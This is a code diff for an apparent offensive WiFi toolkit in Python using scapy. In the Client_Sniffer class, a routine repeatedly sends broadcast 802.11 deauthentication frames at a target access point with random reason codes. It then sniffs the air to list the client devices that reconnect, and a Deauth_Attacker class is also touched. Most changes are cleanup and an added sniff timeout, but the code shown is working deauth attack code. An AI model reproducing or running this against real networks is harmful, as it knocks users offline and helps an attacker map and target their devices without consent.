@@ -146,7 +146,7 @@ class Client_Sniffer():
 
     clients = []
 
-    
+
     @staticmethod
     def _small_deauth(iface, target, verbose=1):
         """Send a deauth packet and sniff the reconnected macs"""
@@ -155,88 +155,77 @@ class Client_Sniffer():
 
         time.sleep(3)
 
-
         while sent < 10:
-
 
             reasons = random.choice([4,5,7,15])
             frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
-            
 
-            sendp(frame, iface=iface, count=15, realtime=False,verbose=False); time.sleep(1)
-
+            sendp(frame, iface=iface, count=15, realtime=False, verbose=False)
+            time.sleep(1)
             sent += 1
 
-            if verbose: console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")
-    
+            if verbose: console.log(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")
+
 
     @classmethod
     def _packet_parser(cls, pkt, target, table):
         """This will parse packets"""
 
-
         try:
 
             if pkt.haslayer(Dot11):
 
-                
                 addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                 addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
 
-
                 if addr1 == target or addr2 == target:
-
-                    
 
                     if addr1 != target and addr1 not in cls.clients and addr1:
 
                         vendor = DataBase.get_vendor_main(mac=addr1)
                         cls.clients.append(addr1)
-
                         table.add_row(f"{len(cls.clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")
 
                     elif addr2 != target and addr2 not in cls.clients and addr2:
 
                         vendor = DataBase.get_vendor_main(mac=addr2)
                         cls.clients.append(addr2)
-
                         table.add_row(f"{len(cls.clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")
 
 
-        except KeyboardInterrupt as e: console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
-        except Exception as e: console.print(f"[bold red]Exception Error:[yellow] {e}")
+        except KeyboardInterrupt as e: console.log(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")
+        except Exception as e: console.log(f"[bold red]Exception Error:[yellow] {e}")
 
-
-    
 
     @classmethod
-    def _sniff_the_target(cls, iface, table, target, channel):
+    def _sniff_the_target(cls, iface, table, target, timeout):
         """This will sniff only from target"""
 
         try:
 
-         
-            sniff(iface=iface, prn=lambda pkt: Client_Sniffer._packet_parser(pkt, target, table), store=0, count=0); time.sleep(1.1)
-    
+            console.print(f"\n[bold red]Sniffing clients for the next [bold green]{timeout}[bold red] seconds - press [bold green]ctrl + c[bold red] to stop early!\n")
+            time.sleep(2)
 
-        except KeyboardInterrupt as e:  console.print(f"[bold red]Exception Error:[bold yellow] {e}")
-        except Exception as e:console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+            with Live(table, console=console, refresh_per_second=2):
+                sniff(iface=iface, prn=lambda pkt: Client_Sniffer._packet_parser(pkt, target, table), store=0, count=0, timeout=timeout)
+
+        except KeyboardInterrupt as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+        except Exception as e:         console.print(f"[bold red]Exception Error:[bold yellow] {e}")
 
 
-    
     @staticmethod
     def main():
         """This will be responsible for controlling class wide logic"""
 
-
         if not Variables.wifi_client_sniffer: return False
 
-        
-        table      = Variables.table    
+        Client_Sniffer.clients = []
+
+        table      = Variables.table
         iface      = Variables.iface
         channel    = Variables.channel
         mac_client = Variables.mac_client
-
+        timeout    = Variables.timeout or 120
 
         table.title = (f"{mac_client} - Client list")
         table.add_column("#")
@@ -244,12 +233,11 @@ class Client_Sniffer():
         table.add_column("-->", style="bold red")
         table.add_column("AP", style="bold green")
         table.add_column("Vendor", style="bold yellow")
-        
 
         Background_Threads.channel_hopper(set_channel=channel)
 
         threading.Thread(target=Client_Sniffer._small_deauth, args=(iface, mac_client), daemon=True).start()
-        Client_Sniffer._sniff_the_target(iface=iface, table=table, target=mac_client, channel=channel)
+        Client_Sniffer._sniff_the_target(iface=iface, table=table, target=mac_client, timeout=timeout)
 
 
 # REMASTERED <-- Frame_Snatcher
@@ -278,6 +266,7 @@ class Deauth_Attacker():
     @classmethod
     def _track_clients(cls, iface, target):
         """Background thread - sniff clients communicating with the target AP"""
+        
 
         def parse(pkt):
             if pkt.haslayer(Dot11):
